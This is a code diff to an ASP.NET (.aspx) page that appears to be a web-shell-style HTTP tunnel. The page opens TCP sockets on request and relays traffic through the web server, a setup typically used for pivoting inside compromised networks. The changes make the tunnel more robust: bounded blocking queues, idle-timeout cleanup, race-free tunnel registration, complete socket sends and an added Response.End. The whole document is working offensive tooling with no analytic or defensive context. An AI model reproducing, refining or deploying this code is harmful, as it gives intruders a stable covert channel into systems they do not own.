@@ -1,18 +1,11 @@
-<%@ Page Language="C#" EnableSessionState="False" %>
-<%@ Import Namespace="System.IO" %>
-<%@ Import Namespace="System.Net" %>
-<%@ Import Namespace="System.Net.Sockets" %>
-<%@ Import Namespace="System.Threading" %>
-<%@ Import Namespace="System.Net.NetworkInformation" %>
-<%@ Import Namespace="System.Collections" %>
-<%@ Import Namespace="System.Collections.Generic" %>
-<%@ Import Namespace="System.Text" %><script runat="server">
+<%@ Page Language="C#" EnableSessionState="False" %><%@ Import Namespace="System.IO" %><%@ Import Namespace="System.Net" %><%@ Import Namespace="System.Net.Sockets" %><%@ Import Namespace="System.Threading" %><%@ Import Namespace="System.Net.NetworkInformation" %><%@ Import Namespace="System.Collections" %><%@ Import Namespace="System.Collections.Generic" %><%@ Import Namespace="System.Text" %><script runat="server">
     // Static variables
     static Hashtable addrs = CollectAddr();
     static Hashtable ctx = Hashtable.Synchronized(new Hashtable());
 
     const string CHARACTERS = "abcdefghijklmnopqrstuvwxyz0123456789";
     const int BUF_SIZE = 1024 * 16;
+    const long TUNNEL_IDLE_TIMEOUT_MILLIS = 300L * 1000L;
 
     // BlockingQueue implementation for .NET 2.0
     public class BlockingQueue<T>
@@ -25,7 +18,26 @@
             lock (lockObj)
             {
                 queue.Enqueue(item);
-                Monitor.Pulse(lockObj);
+                Monitor.PulseAll(lockObj);
+            }
+        }
+
+        public bool Enqueue(T item, int timeoutMs, int maxCount)
+        {
+            lock (lockObj)
+            {
+                DateTime endTime = DateTime.UtcNow.AddMilliseconds(timeoutMs);
+                while (queue.Count >= maxCount)
+                {
+                    int remaining = (int)(endTime - DateTime.UtcNow).TotalMilliseconds;
+                    if (remaining <= 0 || !Monitor.Wait(lockObj, remaining))
+                    {
+                        return false;
+                    }
+                }
+                queue.Enqueue(item);
+                Monitor.PulseAll(lockObj);
+                return true;
             }
         }
 
@@ -42,7 +54,9 @@
                         return default(T);
                     }
                 }
-                return queue.Dequeue();
+                T item = queue.Dequeue();
+                Monitor.PulseAll(lockObj);
+                return item;
             }
         }
 
@@ -54,7 +68,9 @@
                 {
                     return default(T);
                 }
-                return queue.Dequeue();
+                T item = queue.Dequeue();
+                Monitor.PulseAll(lockObj);
+                return item;
             }
         }
 
@@ -375,6 +391,82 @@
     private void RemoveKey(string key)
     {
         ctx.Remove(key);
+    }
+
+    private bool RemoveKeyIfSame(string key, object expected)
+    {
+        lock (ctx.SyncRoot)
+        {
+            if (Object.ReferenceEquals(ctx[key], expected))
+            {
+                ctx.Remove(key);
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private void TouchTunnel(object[] objs)
+    {
+        if (objs == null || objs.Length < 4 || !(objs[3] is long[])) return;
+        long[] activity = (long[])objs[3];
+        lock (activity)
+        {
+            activity[0] = DateTime.UtcNow.Ticks;
+        }
+    }
+
+    private long GetTunnelIdleMillis(object[] objs)
+    {
+        if (objs == null || objs.Length < 4 || !(objs[3] is long[])) return Int64.MaxValue;
+        long[] activity = (long[])objs[3];
+        lock (activity)
+        {
+            return (DateTime.UtcNow.Ticks - activity[0]) / TimeSpan.TicksPerMillisecond;
+        }
+    }
+
+    private void MarkTunnelClosed(object[] objs)
+    {
+        if (objs == null || objs.Length < 5 || !(objs[4] is bool[])) return;
+        bool[] closed = (bool[])objs[4];
+        lock (closed)
+        {
+            closed[0] = true;
+        }
+    }
+
+    private bool IsTunnelClosed(object[] objs)
+    {
+        if (objs == null || objs.Length < 5 || !(objs[4] is bool[])) return true;
+        bool[] closed = (bool[])objs[4];
+        lock (closed)
+        {
+            return closed[0];
+        }
+    }
+
+    private bool WaitForTunnelCleanup(string tunId, object[] objs, BlockingQueue<byte[]> writeQueue)
+    {
+        while (Object.ReferenceEquals(GetKey(tunId), objs))
+        {
+            long remaining = TUNNEL_IDLE_TIMEOUT_MILLIS - GetTunnelIdleMillis(objs);
+            if (remaining <= 0) return false;
+            int waitMillis = remaining > Int32.MaxValue ? Int32.MaxValue : (int)remaining;
+            writeQueue.Dequeue(waitMillis);
+        }
+        return true;
+    }
+
+    private void SendAll(Socket socket, byte[] data)
+    {
+        int offset = 0;
+        while (offset < data.Length)
+        {
+            int sent = socket.Send(data, offset, data.Length - offset, SocketFlags.None);
+            if (sent <= 0) throw new IOException("socket send returned EOF");
+            offset += sent;
+        }
     }
 
     // Template handling
@@ -819,6 +911,14 @@
         MemoryStream ms = new MemoryStream();
         Socket socket = null;
         Dictionary<string, byte[]> resultData = null;
+        object[] existing = (object[])GetKey(tunId);
+        if (existing != null)
+        {
+            TouchTunnel(existing);
+            byte[] existingData = MarshalBase64(NewStatus(tunId, 0x00));
+            ms.Write(existingData, 0, existingData.Length);
+            return ms.ToArray();
+        }
 
         try
         {
@@ -854,27 +954,38 @@
 
             resultData = NewStatus(tunId, 0x00);
 
-            if (newThread)
+            BlockingQueue<byte[]> readQueue = newThread ? new BlockingQueue<byte[]>() : null;
+            BlockingQueue<byte[]> writeQueue = newThread ? new BlockingQueue<byte[]>() : null;
+            object[] newTunnel = new object[] { socket, readQueue, writeQueue, new long[] { DateTime.UtcNow.Ticks }, new bool[] { false } };
+            bool installed = false;
+            lock (ctx.SyncRoot)
             {
-                BlockingQueue<byte[]> readQueue = new BlockingQueue<byte[]>();
-                BlockingQueue<byte[]> writeQueue = new BlockingQueue<byte[]>();
-                PutKey(tunId, new object[] { socket, readQueue, writeQueue });
+                existing = (object[])ctx[tunId];
+                if (existing == null)
+                {
+                    ctx[tunId] = newTunnel;
+                    installed = true;
+                }
+            }
 
+            if (!installed)
+            {
+                socket.Close();
+                TouchTunnel(existing);
+            }
+            else if (newThread)
+            {
                 // Start read thread
                 ThreadPool.QueueUserWorkItem(delegate
                 {
-                    RunReadThread(tunId, socket, readQueue, writeQueue);
+                    RunReadThread(tunId, newTunnel);
                 });
 
                 // Start write thread
                 ThreadPool.QueueUserWorkItem(delegate
                 {
-                    RunWriteThread(tunId, socket, writeQueue);
+                    RunWriteThread(tunId, newTunnel);
                 });
-            }
-            else
-            {
-                PutKey(tunId, new object[] { socket, null, null });
             }
         }
         catch (Exception)
@@ -905,6 +1016,7 @@
         {
             throw new IOException("tunnel not found");
         }
+        TouchTunnel(objs);
 
         Socket socket = (Socket)objs[0];
         // Check if socket is closed
@@ -924,7 +1036,7 @@
             }
             else
             {
-                socket.Send(data);
+                SendAll(socket, data);
             }
         }
     }
@@ -937,6 +1049,7 @@
         {
             throw new IOException("tunnel not found");
         }
+        TouchTunnel(objs);
 
         Socket socket = (Socket)objs[0];
         MemoryStream ms = new MemoryStream();
@@ -965,7 +1078,7 @@
         }
 
         // if socket is closed and no more data, cleanup and send Delete
-        if (!socket.Connected && readQueue.Count == 0)
+        if (IsTunnelClosed(objs) && readQueue.Count == 0)
         {
             PerformDelete(tunId);
             byte[] deleteData = MarshalBase64(NewDel(tunId));
@@ -981,7 +1094,7 @@
         object[] objs = (object[])GetKey(tunId);
         if (objs != null)
         {
-            RemoveKey(tunId);
+            RemoveKeyIfSame(tunId, objs);
             Socket socket = (Socket)objs[0];
             BlockingQueue<byte[]> writeQueue = (BlockingQueue<byte[]>)objs[2];
 
@@ -1001,8 +1114,11 @@
     }
 
     // Background thread for reading from socket
-    private void RunReadThread(string tunId, Socket socket, BlockingQueue<byte[]> readQueue, BlockingQueue<byte[]> writeQueue)
+    private void RunReadThread(string tunId, object[] objs)
     {
+        Socket socket = (Socket)objs[0];
+        BlockingQueue<byte[]> readQueue = (BlockingQueue<byte[]>)objs[1];
+        BlockingQueue<byte[]> writeQueue = (BlockingQueue<byte[]>)objs[2];
         bool selfClean = false;
         try
         {
@@ -1018,10 +1134,8 @@
                 byte[] data = new byte[bytesRead];
                 Array.Copy(buffer, data, bytesRead);
 
-                readQueue.Enqueue(data);
-
-                // Check timeout (60 seconds)
-                if (readQueue.Count > 1000)
+                TouchTunnel(objs);
+                if (!readQueue.Enqueue(data, 60000, 100))
                 {
                     selfClean = true;
                     break;
@@ -1033,10 +1147,13 @@
         }
         finally
         {
+            MarkTunnelClosed(objs);
             if (selfClean)
             {
-                RemoveKey(tunId);
-                readQueue.Clear();
+                if (RemoveKeyIfSame(tunId, objs))
+                {
+                    readQueue.Clear();
+                }
             }
             writeQueue.Clear();
             try
@@ -1051,8 +1168,10 @@
     }
 
     // Background thread for writing to socket
-    private void RunWriteThread(string tunId, Socket socket, BlockingQueue<byte[]> writeQueue)
+    private void RunWriteThread(string tunId, object[] objs)
     {
+        Socket socket = (Socket)objs[0];
+        BlockingQueue<byte[]> writeQueue = (BlockingQueue<byte[]>)objs[2];
         bool selfClean = false;
         try
         {
@@ -1061,24 +1180,25 @@
                 byte[] data = writeQueue.Dequeue(300000); // 300 seconds timeout
                 if (data == null)
                 {
-                    // timeout (no data for 300s), need cleanup
-                    selfClean = true;
-                    break;
+                    if (GetTunnelIdleMillis(objs) >= TUNNEL_IDLE_TIMEOUT_MILLIS)
+                    {
+                        selfClean = true;
+                        break;
+                    }
+                    continue;
                 }
                 if (data.Length == 0)
                 {
-                    // received exit signal, wait for client to read remaining data
-                    byte[] signal = writeQueue.Dequeue(10000); // 10 seconds timeout
-                    if (signal == null)
+                    // Keep queued response data available while the client is actively draining it.
+                    if (Object.ReferenceEquals(GetKey(tunId), objs) &&
+                        !WaitForTunnelCleanup(tunId, objs, writeQueue))
                     {
-                        // no request within 10s, force cleanup
                         selfClean = true;
                     }
-                    // if received signal (from performDelete), exit normally without cleanup
                     break;
                 }
 
-                socket.Send(data);
+                SendAll(socket, data);
             }
         }
         catch (Exception)
@@ -1088,7 +1208,7 @@
         {
             if (selfClean)
             {
-                RemoveKey(tunId);
+                RemoveKeyIfSame(tunId, objs);
             }
             writeQueue.Clear();
             try
@@ -1264,4 +1384,5 @@
     catch (Exception)
     {
     }
+    Response.End();
 %>
